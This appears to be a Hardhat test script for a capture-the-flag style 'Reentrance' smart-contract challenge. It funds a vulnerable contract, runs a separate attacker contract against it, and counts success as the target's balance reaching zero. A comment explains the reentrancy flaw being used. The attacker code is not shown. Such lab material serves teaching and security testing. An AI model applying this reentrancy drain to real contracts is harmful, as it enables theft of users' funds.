const { expect } = require('chai');
const { ethers } = require('hardhat');

describe('Reentrance', function () {
    let deployer, attacker;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const Factory = await ethers.getContractFactory('Reentrance', deployer);
        this.reentrance = await Factory.deploy();
        await deployer.sendTransaction({to:this.reentrance.address, value: ethers.utils.parseEther("0.001")})
    });
    // With the call done inside the re-entrance contract we can withdraw again before our balance gets updated
    it('Exploit', async function () {
      const Factory = await ethers.getContractFactory('ReentranceAttacker', attacker);
      let attackerContract = await Factory.deploy();
      await attackerContract.attack(this.reentrance.address, {value: ethers.utils.parseEther("0.001")});
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        expect(
            await ethers.provider.getBalance(this.reentrance.address)
        ).to.be.eq(0);
    });
});